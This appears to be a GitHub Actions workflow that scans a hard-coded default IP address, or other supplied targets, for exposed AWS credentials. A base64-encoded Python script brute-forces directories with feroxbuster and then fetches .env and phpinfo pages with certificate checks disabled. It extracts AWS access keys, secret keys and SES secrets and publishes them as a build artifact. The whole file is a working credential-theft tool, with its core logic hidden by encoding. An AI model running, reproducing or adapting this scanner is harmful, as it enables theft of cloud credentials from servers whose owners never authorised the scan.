name: AWS Key Scanner

on:
  workflow_dispatch:
    inputs:
      targets:
        description: "IP/domaines (virgules)"
        required: true
        default: "98.92.70.139"
      wordlist_url:
        description: "URL wordlist"
        required: false
        default: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: "3.10"
      
      - name: Install feroxbuster
        run: |
          wget https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.tar.gz
          tar -xzf x86_64-linux-feroxbuster.tar.gz
          chmod +x feroxbuster
          sudo mv feroxbuster /usr/local/bin/
      
      - name: Download wordlist
        run: wget -O wordlist.txt "${{ github.event.inputs.wordlist_url }}"
      
      - name: Create scanner
        run: echo "aW1wb3J0IGpzb24KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB1cmxsaWIuZXJyb3IKaW1wb3J0IHNzbAppbXBvcnQgb3MKaW1wb3J0IHJlCmltcG9ydCBzeXMKCnNzbF9jdHggPSBzc2wuX2NyZWF0ZV91bnZlcmlmaWVkX2NvbnRleHQoKQphd3NfYWNjZXNzX2tleV9yZWdleCA9IHJlLmNvbXBpbGUocidBS0lBW0EwLVo5XXsxNn0nKQpzZWNyZXRfb3Jfc2VzX3JlZ2V4ID0gcmUuY29tcGlsZShyJ1tcdysvPV17NDAsNDR9JykKCmRlZiBleHRyYWN0X2tleXNfZnJvbV9lbnYoY29udGVudCk6CiAgICBsaW5lcyA9IGNvbnRlbnQuc3BsaXRsaW5lcygpCiAgICByZXN1bHRzID0gW10KICAgIGZvciBpZHgsIGxpbmUgaW4gZW51bWVyYXRlKGxpbmVzKToKICAgICAgICBpZiBhd3NfYWNjZXNzX2tleV9yZWdleC5zZWFyY2gobGluZSk6CiAgICAgICAgICAgIHN0YXJ0ID0gbWF4KDAsIGlkeCAtIDMpCiAgICAgICAgICAgIGVuZCA9IG1pbihsZW4obGluZXMpLCBpZHggKyA0KQogICAgICAgICAgICBjb250ZXh0X2xpbmVzID0gbGluZXNbc3RhcnQ6ZW5kXQogICAgICAgICAgICBhY2Nlc3Nfa2V5ID0gYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpLmdyb3VwKCkgaWYgYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpIGVsc2UgTm9uZQogICAgICAgICAgICBzZWNyZXRfa2V5ID0gTm9uZQogICAgICAgICAgICBzZXNfc2VjcmV0ID0gTm9uZQogICAgICAgICAgICBmb3IgY29udGV4dF9saW5lIGluIGNvbnRleHRfbGluZXM6CiAgICAgICAgICAgICAgICBpZiAnPScgaW4gY29udGV4dF9saW5lOgogICAgICAgICAgICAgICAgICAgIF8sIHZhbHVlID0gY29udGV4dF9saW5lLnNwbGl0KCc9JywgMSkKICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHZhbHVlLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBsZW4odmFsdWUpID09IDQwOgogICAgICAgICAgICAgICAgICAgICAgICBzZWNyZXRfa2V5ID0gdmFsdWUKICAgICAgICAgICAgICAgICAgICBlbGlmIGxlbih2YWx1ZSkgPT0gNDQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlc19zZWNyZXQgPSB2YWx1ZQogICAgICAgICAgICByZXN1bHRzLmFwcGVuZCh7ImFjY2Vzc19rZXkiOiBhY2Nlc3Nfa2V5LCAic2VjcmV0X2tleSI6IHNlY3JldF9rZXksICJzZXNfc2VjcmV0Ijogc2VzX3NlY3JldH0pCiAgICByZXR1cm4gcmVzdWx0cwoKZGVmIGV4dHJhY3Rfa2V5c19mcm9tX2luZm9fcGhwKGNvbnRlbnQpOgogICAgbGluZXMgPSBjb250ZW50LnNwbGl0bGluZXMoKQogICAgcmVzdWx0cyA9IFtdCiAgICBmb3IgaWR4LCBsaW5lIGluIGVudW1lcmF0ZShsaW5lcyk6CiAgICAgICAgaWYgYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpOgogICAgICAgICAgICBtID0gYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpCiAgICAgICAgICAgIGFjY2Vzc19rZXkgPSBtLmdyb3VwKCkgaWYgbSBlbHNlIE5vbmUKICAgICAgICAgICAgc3RhcnQgPSBtYXgoMCwgaWR4IC0gMykKICAgICAgICAgICAgZW5kID0gbWluKGxlbihsaW5lcyksIGlkeCArIDQpCiAgICAgICAgICAgIGNvbnRleHRfbGluZXMgPSBsaW5lc1tzdGFydDplbmRdCiAgICAgICAgICAgIHNlY3JldF9rZXkgPSBOb25lCiAgICAgICAgICAgIHNlc19zZWNyZXQgPSBOb25lCiAgICAgICAgICAgIGZvciBjdHggaW4gY29udGV4dF9saW5lczoKICAgICAgICAgICAgICAgIGZvciBjYW5kIGluIHNlY3JldF9vcl9zZXNfcmVnZXguZmluZGFsbChjdHgpOgogICAgICAgICAgICAgICAgICAgIGlmIGxlbihjYW5kKSA9PSA0MCBhbmQgc2VjcmV0X2tleSBpcyBOb25lOgogICAgICAgICAgICAgICAgICAgICAgICBzZWNyZXRfa2V5ID0gY2FuZAogICAgICAgICAgICAgICAgICAgIGVsaWYgbGVuKGNhbmQpID09IDQ0IGFuZCBzZXNfc2VjcmV0IGlzIE5vbmU6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlc19zZWNyZXQgPSBjYW5kCiAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKHsiYWNjZXNzX2tleSI6IGFjY2Vzc19rZXksICJzZWNyZXRfa2V5Ijogc2VjcmV0X2tleSwgInNlc19zZWNyZXQiOiBzZXNfc2VjcmV0fSkKICAgIHJldHVybiByZXN1bHRzCgpkZWYgc2Nhbl90YXJnZXQodGFyZ2V0LCB3b3JkbGlzdCk6CiAgICB0YXJnZXQgPSAiaHR0cDovLyIgKyB0YXJnZXQKICAgIGNtZCA9IFsiZmVyb3hidXN0ZXIiLCAiLXUiLCB0YXJnZXQsICItdyIsIHdvcmRsaXN0LCAiLS1zaWxlbnQiLCAiLXQiLCAiMTAiLCAiLWQiLCAiMiJdCiAgICBwcmludChmIlJ1bm5pbmc6IHsnICcuam9pbihjbWQpfSIpCiAgICBwcm9jID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIHRleHQ9VHJ1ZSkKICAgIHN0ZG91dF9kYXRhLCBzdGRlcnJfZGF0YSA9IHByb2MuY29tbXVuaWNhdGUoKQogICAgaWYgcHJvYy5yZXR1cm5jb2RlICE9IDA6CiAgICAgICAgcHJpbnQoZiJmZXJveGJ1c3RlciBmYWlsZWQ6IHtzdGRlcnJfZGF0YX0iKQogICAgICAgIHJldHVybiBbXQogICAgZGlycyA9IFtdCiAgICBmb3IgbGluZSBpbiBzdGRvdXRfZGF0YS5zcGxpdGxpbmVzKCk6CiAgICAgICAgbGluZSA9IGxpbmUuc3RyaXAoKQogICAgICAgIGlmIGxpbmU6CiAgICAgICAgICAgIHBhcnRzID0gbGluZS5zcGxpdCgpCiAgICAgICAgICAgIGlmIHBhcnRzOgogICAgICAgICAgICAgICAgdXJsID0gcGFydHNbLTFdCiAgICAgICAgICAgICAgICBkaXJzLmFwcGVuZCh1cmwpCiAgICByZXR1cm4gZGlycwoKZGVmIGNoZWNrX2VuZHBvaW50cyhkaXJzKToKICAgIGZpbmRpbmdzID0gW10KICAgIGZvciBkaXJfdXJsIGluIGRpcnM6CiAgICAgICAgZW52X3VybCA9IGRpcl91cmwucnN0cmlwKCIvIikgKyAiLy5lbnYiCiAgICAgICAgcHJpbnQoZiJDaGVja2luZzoge2Vudl91cmx9IikKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlcSA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoZW52X3VybCwgbWV0aG9kPSJHRVQiKQogICAgICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCBjb250ZXh0PXNzbF9jdHgsIHRpbWVvdXQ9MTUpIGFzIHJlc3A6CiAgICAgICAgICAgICAgICBpZiByZXNwLmdldGNvZGUoKSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgY29udGVudCA9IHJlc3AucmVhZCgpLmRlY29kZShlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgICAgICAgICAgaWYgYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGNvbnRlbnQpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3VuZF9rZXlzID0gZXh0cmFjdF9rZXlzX2Zyb21fZW52KGNvbnRlbnQpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbmRpbmdzLmFwcGVuZCh7InVybCI6IGVudl91cmwsICJ0eXBlIjogIi5lbnYiLCAia2V5cyI6IGZvdW5kX2tleXN9KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKICAgICAgICBmb3IgaW5mb19uYW1lIGluIFsiaW5mby5waHAiLCAicGhwaW5mby5waHAiXToKICAgICAgICAgICAgaW5mb191cmwgPSBkaXJfdXJsLnJzdHJpcCgiLyIpICsgIi8iICsgaW5mb19uYW1lCiAgICAgICAgICAgIHByaW50KGYiQ2hlY2tpbmc6IHtpbmZvX3VybH0iKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXFfaW5mbyA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoaW5mb191cmwsIG1ldGhvZD0iR0VUIikKICAgICAgICAgICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXFfaW5mbywgY29udGV4dD1zc2xfY3R4LCB0aW1lb3V0PTE1KSBhcyByZXNwOgogICAgICAgICAgICAgICAgICAgIGlmIHJlc3AuZ2V0Y29kZSgpID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgaW5mb19jb250ZW50ID0gcmVzcC5yZWFkKCkuZGVjb2RlKGVycm9ycz0naWdub3JlJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGluZm9fY29udGVudCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3VuZF9rZXlzX2luZm8gPSBleHRyYWN0X2tleXNfZnJvbV9pbmZvX3BocChpbmZvX2NvbnRlbnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaW5kaW5ncy5hcHBlbmQoeyJ1cmwiOiBpbmZvX3VybCwgInR5cGUiOiBpbmZvX25hbWUsICJrZXlzIjogZm91bmRfa2V5c19pbmZvfSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MKICAgIHJldHVybiBmaW5kaW5ncwoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHRhcmdldHMgPSBzeXMuYXJndlsxXS5zcGxpdCgiLCIpCiAgICB3b3JkbGlzdCA9IHN5cy5hcmd2WzJdCiAgICBhbGxfZmluZGluZ3MgPSBbXQogICAgZm9yIHRhcmdldCBpbiB0YXJnZXRzOgogICAgICAgIHRhcmdldCA9IHRhcmdldC5zdHJpcCgpCiAgICAgICAgcHJpbnQoZiJcbj09PSBTY2FubmluZyB7dGFyZ2V0fSA9PT0iKQogICAgICAgIGRpcnMgPSBzY2FuX3RhcmdldCh0YXJnZXQsIHdvcmRsaXN0KQogICAgICAgIHByaW50KGYiRm91bmQge2xlbihkaXJzKX0gZGlyZWN0b3JpZXMiKQogICAgICAgIGZpbmRpbmdzID0gY2hlY2tfZW5kcG9pbnRzKGRpcnMpCiAgICAgICAgYWxsX2ZpbmRpbmdzLmV4dGVuZChmaW5kaW5ncykKICAgIHByaW50KGYiXG49PT0gUmVzdWx0cyA9PT0iKQogICAgcHJpbnQoanNvbi5kdW1wcyhhbGxfZmluZGluZ3MsIGluZGVudD0yKSkKICAgIHdpdGggb3BlbigicmVzdWx0cy5qc29uIiwgInciKSBhcyBmOgogICAgICAgIGpzb24uZHVtcChhbGxfZmluZGluZ3MsIGYsIGluZGVudD0yKQo=" | base64 -d > scanner.py
      
      - name: Run scan
        run: python scanner.py "${{ github.event.inputs.targets }}" wordlist.txt
      
      - name: Upload results
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: scan-results
          path: results.json
      
      - name: Show results
        if: always()
        run: |
          if [ -f results.json ]; then
            echo "=== Scan Results ==="
            cat results.json
          fi
